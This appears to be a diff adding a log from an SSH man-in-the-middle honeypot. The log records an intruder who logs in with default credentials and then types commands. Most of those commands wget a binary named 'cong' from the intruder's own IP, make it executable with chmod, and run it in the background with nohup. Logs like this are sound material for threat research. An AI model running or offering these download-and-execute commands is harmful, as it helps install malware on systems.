@@ -1,0 +1,57 @@
+2019-11-13 23:51:16.632 - [Info] MITM Version: 1.26
+2019-11-13 23:51:16.638 - [Info] Auto Access Enabled: true
+2019-11-13 23:51:16.639 - [Debug] [Init] Auto Access Barrier: true
+2019-11-13 23:51:16.663 - [Info] SSH man-in-the-middle server for 172.20.0.6 listening on 0.0.0.0:10105
+2019-11-14 00:57:44.305 - [Debug] [Connection] Attacker connected: 221.229.162.251 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-11-14 00:57:47.159 - [Debug] [Auth] Attacker 221.229.162.251 trying to authenticate with "password"
+2019-11-14 00:57:47.160 - [Debug] [Auto Access] Attacker: 221.229.162.251, Threshold: 1, Attempts: 1
+2019-11-14 00:57:47.160 - [Debug] [Auto Access] Compromising the honeypot
+2019-11-14 00:57:47.160 - [Debug] [Auto Access] Adding the following credentials: "ubnt:123"
+2019-11-14 00:57:47.397 - [Debug] [Auth] Valid credentials - Password Authentication
+2019-11-14 00:57:47.398 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.6
+2019-11-14 00:57:47.436 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2019-11-14 00:57:49.802 - [Debug] [SHELL] Opened shell for attacker
+2019-11-14 00:57:50.544 - [Debug] [SHELL] Attacker Keystroke: cd[Space]/tmp[LF]
+2019-11-14 00:57:50.548 - [Debug] [SHELL] line from reader: cd /tmp
+2019-11-14 00:57:50.548 - [Debug] [SHELL] Keystroke buffer: 99,100,32,47,116,109,112,10
+2019-11-14 00:57:54.549 - [Debug] [SHELL] Attacker Keystroke: wget[Space]http://221.229.162.251:1234/cong[LF]
+2019-11-14 00:57:54.553 - [Debug] [SHELL] line from reader: wget http://221.229.162.251:1234/cong
+2019-11-14 00:57:54.554 - [Debug] [SHELL] Keystroke buffer: 119,103,101,116,32,104,116,116,112,58,47,47,50,50,49,46,50,50,57,46,49,54,50,46,50,53,49,58,49,50,51,52,47,99,111,110,103,10
+2019-11-14 00:57:58.559 - [Debug] [SHELL] Attacker Keystroke: chmod[Space]0755[Space]/root/cong[LF]
+2019-11-14 00:57:58.561 - [Debug] [SHELL] line from reader: chmod 0755 /root/cong
+2019-11-14 00:57:58.562 - [Debug] [SHELL] Keystroke buffer: 99,104,109,111,100,32,48,55,53,53,32,47,114,111,111,116,47,99,111,110,103,10
+2019-11-14 00:58:02.569 - [Debug] [SHELL] Attacker Keystroke: nohup[Space]/root/cong[Space]>[Space]/dev/null[Space]2>&1[Space]&[LF]
+2019-11-14 00:58:02.582 - [Debug] [SHELL] line from reader: nohup /root/cong > /dev/null 2>&1 &
+2019-11-14 00:58:02.582 - [Debug] [SHELL] Keystroke buffer: 110,111,104,117,112,32,47,114,111,111,116,47,99,111,110,103,32,62,32,47,100,101,118,47,110,117,108,108,32,50,62,38,49,32,38,10
+2019-11-14 00:58:06.577 - [Debug] [SHELL] Attacker Keystroke: chmod[Space]777[Space]cong[LF]
+2019-11-14 00:58:06.578 - [Debug] [SHELL] line from reader: chmod 777 cong
+2019-11-14 00:58:06.578 - [Debug] [SHELL] Keystroke buffer: 99,104,109,111,100,32,55,55,55,32,99,111,110,103,10
+2019-11-14 00:58:10.587 - [Debug] [SHELL] Attacker Keystroke: ./cong[LF]
+2019-11-14 00:58:10.588 - [Debug] [SHELL] line from reader: ./cong
+2019-11-14 00:58:10.588 - [Debug] [SHELL] Keystroke buffer: 46,47,99,111,110,103,10
+2019-11-14 00:58:14.596 - [Debug] [SHELL] Attacker Keystroke: chmod[Space]0755[Space]/root/cong[LF]
+2019-11-14 00:58:14.597 - [Debug] [SHELL] line from reader: chmod 0755 /root/cong
+2019-11-14 00:58:14.598 - [Debug] [SHELL] Keystroke buffer: 99,104,109,111,100,32,48,55,53,53,32,47,114,111,111,116,47,99,111,110,103,10
+2019-11-14 00:58:18.605 - [Debug] [SHELL] Attacker Keystroke: nohup[Space]/root/cong[Space]&gt;[Space]/dev/null[Space]2&gt;&amp;1[Space]&amp;[LF]
+2019-11-14 00:58:18.606 - [Debug] [SHELL] line from reader: nohup /root/cong &gt; /dev/null 2&gt;&amp;1 &amp;
+2019-11-14 00:58:18.607 - [Debug] [SHELL] Keystroke buffer: 110,111,104,117,112,32,47,114,111,111,116,47,99,111,110,103,32,38,103,116,59,32,47,100,101,118,47,110,117,108,108,32,50,38,103,116,59,38,97,109,112,59,49,32,38,97,109,112,59,10
+2019-11-14 00:58:22.614 - [Debug] [SHELL] Attacker Keystroke: chmod[Space]0777[Space]cong[LF]
+2019-11-14 00:58:22.615 - [Debug] [SHELL] line from reader: chmod 0777 cong
+2019-11-14 00:58:22.615 - [Debug] [SHELL] Keystroke buffer: 99,104,109,111,100,32,48,55,55,55,32,99,111,110,103,10
+2019-11-14 00:58:26.623 - [Debug] [SHELL] Attacker Keystroke: chmod[Space]u+x[Space]cong[LF]
+2019-11-14 00:58:26.625 - [Debug] [SHELL] line from reader: chmod u+x cong
+2019-11-14 00:58:26.625 - [Debug] [SHELL] Keystroke buffer: 99,104,109,111,100,32,117,43,120,32,99,111,110,103,10
+2019-11-14 00:58:30.632 - [Debug] [SHELL] Attacker Keystroke: ./cong[Space]&[LF]
+2019-11-14 00:58:30.633 - [Debug] [SHELL] line from reader: ./cong &
+2019-11-14 00:58:30.633 - [Debug] [SHELL] Keystroke buffer: 46,47,99,111,110,103,32,38,10
+2019-11-14 00:58:34.642 - [Debug] [SHELL] Attacker Keystroke: chmod[Space]u+x[Space]cong[LF]
+2019-11-14 00:58:34.643 - [Debug] [SHELL] line from reader: chmod u+x cong
+2019-11-14 00:58:34.643 - [Debug] [SHELL] Keystroke buffer: 99,104,109,111,100,32,117,43,120,32,99,111,110,103,10
+2019-11-14 00:58:38.651 - [Debug] [SHELL] Attacker Keystroke: .cong[Space]&[LF]
+2019-11-14 00:58:38.652 - [Debug] [SHELL] line from reader: .cong &
+2019-11-14 00:58:38.652 - [Debug] [SHELL] Keystroke buffer: 46,99,111,110,103,32,38,10
+2019-11-14 00:58:48.669 - [Debug] [SHELL] Attacker ended the shell
+2019-11-14 00:58:48.672 - [Debug] [Connection] Attacker closed connection
+2019-11-14 00:58:48.680 - [Debug] [LXC] Container's OpenSSH server ended connection
+2019-11-14 00:58:48.681 - [Debug] [LXC] Container's OpenSSH server closed connection
+2019-11-14 00:58:48.682 - [Debug] [SHELL] Honeypot ended shell
